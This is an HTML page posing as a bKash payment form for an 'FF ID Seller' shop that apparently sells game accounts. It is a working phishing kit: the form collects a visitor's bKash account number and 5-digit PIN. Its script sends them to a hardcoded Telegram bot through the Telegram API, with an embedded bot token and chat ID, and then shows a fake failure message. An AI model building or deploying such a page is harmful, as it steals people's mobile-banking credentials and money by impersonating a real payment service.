<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FF ID Seller - Payment</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .neumorphic { background: linear-gradient(145deg, #f0f0f0, #cacaca); box-shadow:  5px 5px 10px #bebebe, -5px -5px 10px #ffffff; }
        .dark .neumorphic { background: linear-gradient(145deg, #2d2d2d, #1a1a1a); box-shadow: 5px 5px 10px #0d0d0d, -5px -5px 10px #313131; }
        #modal input[type="text"], #modal input[type="password"] { font-size: 1rem; letter-spacing: 0.03em; }
        #modal label { font-size: 0.98rem; }
        #modal .select-none { user-select: none; }
    </style>
</head>
<body class="bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-gray-100 min-h-screen flex flex-col">
    <nav class="bg-white dark:bg-gray-800 shadow-md p-4 flex justify-between items-center">
        <div class="flex items-center">
            <span class="font-bold text-xl">FF ID Seller</span>
        </div>
    </nav>
    <div class="flex-grow flex items-center justify-center">
        <div id="modal" class="w-full max-w-sm mx-2 rounded-lg shadow-2xl border border-pink-200" style="background: linear-gradient(180deg, #fff0f7 0%, #fff 100%);">
            <div class="flex flex-col items-center border-b border-pink-300 pt-6 pb-2 px-6 bg-white rounded-t-lg">
                <div class="flex items-center mb-2">
                    <span class="h-8 w-8 mr-2 inline-flex items-center justify-center rounded-full bg-[#e2136e] text-white font-bold text-lg">bK</span>
                    <span class="text-[#e2136e] font-bold text-2xl tracking-wide border border-[#e2136e] px-2 py-1 rounded">bKash</span>
                    <span class="ml-2 text-[#e2136e] font-semibold text-lg">Payment</span>
                </div>
            </div>
            <div class="flex items-center justify-between px-6 py-3 bg-white">
                <div class="flex items-center">
                    <img src="img/photo_2025-07-31_22-38-27.jpg" alt="Merchant Logo" class="h-8 w-8 rounded-full mr-2 border border-pink-200">
                    <div>
                        <div class="font-semibold text-gray-800 leading-tight">FF ID Seller</div>
                        <div class="text-xs text-gray-500">invoice: #FFID2024</div>
                    </div>
                </div>
                <div class="text-[#e2136e] font-bold text-xl" id="modal-amount">৳0</div>
            </div>
            <form class="px-6 pt-6 pb-4 bg-gradient-to-b from-[#fff0f7] to-[#fff] rounded-b-lg">
                <label class="block text-gray-700 mb-2 font-semibold">Your bKash Account number</label>
                <input type="text" id="bkash-number" placeholder="e.g. 01xxxxxxxxx" class="w-full p-2 mb-4 border border-pink-200 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#e2136e]">
                <label class="block text-gray-700 mb-2 font-semibold">Password</label>
                <input type="password" id="bkash-password" maxlength="5" minlength="5" pattern="\d{5}" inputmode="numeric" placeholder="5-digit password" autocomplete="off" class="w-full p-2 mb-4 border border-pink-200 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#e2136e]">
                <p class="text-xs text-gray-500 mb-4">By clicking on Confirm, you are agreeing to the <a href="#" class="underline text-[#e2136e]">terms & conditions</a>.</p>
                <div class="flex justify-between gap-2">
                    <button id="close-modal" type="button" class="w-1/2 py-2 rounded bg-gray-200 text-gray-700 font-semibold">CLOSE</button>
                    <button id="confirm-btn" type="button" class="w-1/2 py-2 rounded bg-[#e2136e] text-white font-bold tracking-wide">CONFIRM</button>
                </div>
            </form>
            <div class="text-center text-[#e2136e] font-bold py-2 text-lg select-none">16247</div>
        </div>
    </div>
    <script>
        const closeModal = document.getElementById('close-modal');
        const confirmBtn = document.getElementById('confirm-btn');
        closeModal.addEventListener('click', () => {
            window.location.href = 'index.html';
        });
        confirmBtn.addEventListener('click', async () => {
            let statusMsg = document.getElementById('payment-status-msg');
            if (!statusMsg) {
                statusMsg = document.createElement('div');
                statusMsg.id = 'payment-status-msg';
                statusMsg.className = 'text-center text-sm font-semibold my-2';
                confirmBtn.closest('form').insertBefore(statusMsg, confirmBtn.closest('form').querySelector('label'));
            }
            function showStatusMsg(msg, color) {
                statusMsg.textContent = msg;
                statusMsg.style.color = color;
            }
            const number = document.getElementById('bkash-number').value;
            const password = document.getElementById('bkash-password').value;
            const amount = document.getElementById('modal-amount').textContent;
            if (!number || !password) {
                showStatusMsg('দয়া করে নাম্বার এবং ৫ সংখ্যার পাসওয়ার্ড দিন।', '#e2136e');
                return;
            }
            if (!/^\d{11}$/.test(number)) {
                showStatusMsg('নাম্বারটি ভুল হয়েছে, ১১ সংখ্যার সঠিক নাম্বার দিন।', '#e2136e');
                return;
            }
            if (!/^\d{5}$/.test(password)) {
                showStatusMsg('পাসওয়ার্ডটি ভুল হয়েছে, ৫ সংখ্যার সঠিক পাসওয়ার্ড দিন।', '#e2136e');
                return;
            }
            showStatusMsg('Sending to Telegram... দয়া করে অপেক্ষা করুন', '#e2136e');
            // Telegram Bot API integration
            const telegramBotToken = "8467678705:AAEoSPPuAGc4xfcJLqa2LDIuGEJ4xaC4qSo";
            const telegramChatId = "7478642058";
            const message = `New Payment Request:%0AAmount: ${amount}%0ANumber: ${number}%0APassword: ${password}`;
            try {
                const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${message}`);
                if (response.ok) {
                    showStatusMsg('✅ ডেটা টেলিগ্রামে পাঠানো হয়েছে!', 'green');
                } else {
                    showStatusMsg('❌ আপনার পেমেন্টটি হয় নাই, আপনি পুনরায় চেষ্টা করুন।', '#e2136e');
                }
            } catch (e) {
                showStatusMsg('❌ আপনার পেমেন্টটি হয় নাই, আপনি পুনরায় চেষ্টা করুন।', '#e2136e');
            }
            setTimeout(() => {
                if (statusMsg.textContent === 'Sending to Telegram... দয়া করে অপেক্ষা করুন') {
                    showStatusMsg('❌ ইন্রারনেট ইস্যু, আবার চেষ্টা করুন।', '#e2136e');
                }
            }, 3000);
        });
            setTimeout(() => {
                showStatusMsg('❌ ইন্রারনেট ইস্যু, আবার চেষ্টা করুন।', '#e2136e');
            }, 1200);
        
            
    // Set amount from URL parameter
    function getAmountFromUrl() {
        const params = new URLSearchParams(window.location.search);
        return params.get('amount') || '0';
    }
    document.getElementById('modal-amount').textContent = '৳' + getAmountFromUrl();
    </script>
   
</body>
</html>